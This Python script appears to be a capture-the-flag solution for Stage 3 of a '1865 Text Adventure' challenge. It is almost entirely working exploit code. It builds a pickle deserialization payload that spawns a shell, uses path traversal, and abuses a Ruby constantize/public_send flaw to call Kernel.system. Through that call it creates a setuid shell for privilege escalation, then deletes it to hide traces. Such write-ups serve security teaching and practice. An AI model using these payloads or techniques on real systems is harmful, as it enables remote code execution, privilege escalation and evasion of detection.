#!/usr/bin/env python

'''
1865 Text Adventure
Solution for Stage 3

The Ruby service contains a number of reflective transformations in the handler:

class SmokeController < ApplicationController

  skip_parameter_encoding :remember

  def remember
    # Log down messages from our happy players!

    begin
      ctype = "File"
      if params.has_key? :ctype
        # Support for future appending type.
        ctype = params[:ctype]
      end

      cargs = []
      if params.has_key?(:cargs) && params[:cargs].kind_of?(Array)
        cargs = params[:cargs]
      end

      cop = "new"
      if params.has_key?(:cop)
        cop = params[:cop]
      end

      if params.has_key?(:uniqid) && params.has_key?(:content)
        # Leave the kind messages
        fn = Rails.application.config.message_dir + params[:uniqid]
        cargs.unshift(fn)
        c = ctype.constantize
        k = c.public_send(cop, *cargs)
        if k.kind_of?(File)
          k.write(params[:content])
          k.close()
        else
          # Implement more types when we need distributed logging.
          render :plain => "Type is not implemented yet."
          return
        end

      else
        render :plain => "ERROR"
        return
      end
    rescue => e
      render :plain => "ERROR: " + e.to_s
      return
    end

    render :plain => "OK"
  end
end

Some useful observations:

* The ctype parameter gets converted into a constant from a string. This lets us get a reference to
    modules such as Kernel.
* The cop parameter gets invoked as the name of a function via the public_send method.
* A combination of uniqid and cargs can be used to control the arguments to the invoked function.

This can be used to invoke:

    Kernel.system(
        "/opt/wonderland/logs/../../../../../../../bin/bash",
        "-c",
        "<command to execute>"
    )
'''

from pwn import *
from common import Common
from urllib.request import quote

import pickle
import os
import uuid


class Exploit:
    '''Spawns a /bin/bash shell when deserialized.

    Includes some required strings that are checked server-side to determine 'dill-ness'.
    '''

    def __reduce__(self):
        cmd = ('/bin/sh')
        return os.system, (cmd,), {'a': 'dill._dill', 'b': 'rabbithole', 'c': 'on_get'}


def main():
    # Get the connection.
    c = Common.get_connection()
    c.init_connection()

    # Move to the a-shallow-deadend to get the pocket-watch.
    # This pocket-watch allows us to turn off text scrolling.
    log.info('Moving to the a-shallow-deadend to get the pocket-watch...')
    c.move(b'a-shallow-deadend')
    c.get(b'pocket-watch')
    log.info('Disabling text scroll.')
    c.sendline(b'options text_scroll f')
    c.back()

    # Move to the a-curious-hall and drink the pink-bottle.
    log.info('Moving to a-curious-hall to drink the pink-bottle...')
    next_path = [b'deeper-into-the-burrow', b'a-curious-hall', b'a-curious-hall']
    c.multimove(next_path)
    c.get(b'pink-bottle')

    # Move to the a-fancy-pavillion and eat the fluffy-cake.
    log.info('Moving to a-fancy-pavillion to eat the fluffy-cake...')
    next_path = [b'a-pink-door', b'maze-entrance', b'knotted-boughs', b'dazzling-pines',
                 b'a-pause-in-the-trees', b'confusing-knot', b'green-clearing',
                 b'a-fancy-pavillion']
    c.multimove(next_path)
    c.get(b'fluffy-cake')

    # Move to a-mystical-cove to get the looking-glass.
    log.info('Moving to a-mystical-cove to get the looking-glass...')
    next_path = [b'along-the-rolling-waves', b'a-sandy-shore', b'a-mystical-cove']
    c.multimove(next_path)
    c.get(b'looking-glass')

    # Teleport to the location of the golden-hookah.
    log.info('Teleporting to under-a-giant-mushroom to get the golden-hookah...')
    mushroom = ('sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-'
                'the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom')
    c.sendline('teleport ' + mushroom)
    c.get(b'golden-hookah')

    # Teleport to /opt/wonderland/logs/
    log.info('Teleporting to /opt/wonderland/logs')
    c.sendline(b'teleport ../../../../../../opt/wonderland/logs')
    c.get_until_prompt()

    # Generate the payload and write an item to the logs directory.
    log.info('Generating pickle RCE payload...')
    payload = quote(pickle.dumps(Exploit()), safe='').encode('ascii')
    random_filename = str(uuid.uuid4()).encode('ascii')
    log.info('Writing payload to {}.item'.format(random_filename.decode('ascii')))
    c.sendline(b'blowsmoke ' + random_filename + b'.item ' + payload)
    c.get_until_prompt()

    # Trigger the first RCE.
    log.info('Triggering RCE...')
    c.sendline(b'get logs-' + random_filename)
    c.get_until_prompt()
    c.get_until_prompt()

    # Create a mouse SUID shell via the pool-of-tears constantize vulnerability.
    # Construct the URL
    log.info('Constructing pool-of-tears exploit URL.')
    binbash = quote('../../../../../../../bin/bash', safe='')
    cmd_args = [
        'cp /bin/sh /tmp/hackers_use_me/pwn',
        'chmod +x /tmp/hackers_use_me/pwn',
        'chmod +s /tmp/hackers_use_me/pwn'
    ]
    cmd = quote(';'.join(cmd_args), safe='')
    exploit_url = ('http://localhost:4000/api/v1/smoke?uniqid={}&ctype=Kernel&cop=system&'
                   'cargs[]=-c&cargs[]={}&content=potato').format(binbash, cmd)
    # Send the exploit to abuse Kernel.system to create a mouse SUID binary.
    log.info('Sending curl request to trigger the creation of the SUID binary.')
    c.sendline("curl '{}'".format(exploit_url))
    c.recvuntil('Type is not implemented yet.')
    # Trigger the privilege escalation, /bin/sh -p.
    log.info('Triggering the SUID binary to escalate to the mouse user.')
    c.sendline('/tmp/hackers_use_me/pwn -p')
    # Remove the binary.
    log.info('Removing the SUID binary to clean up the tracks.')
    c.sendline('rm /tmp/hackers_use_me/pwn')

    # Get the flag.
    log.info('Getting the flag by executing /home/mouse/flag3.bin')
    log.success('Flag 3:')
    c.sendline('/home/mouse/flag3.bin')
    c.sendline('echo END_OF_FLAG')
    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b''))

    # Drop into an interactive shell.
    log.success('Enjoy your shell!')
    c.interactive()


if __name__ == '__main__':
    main()
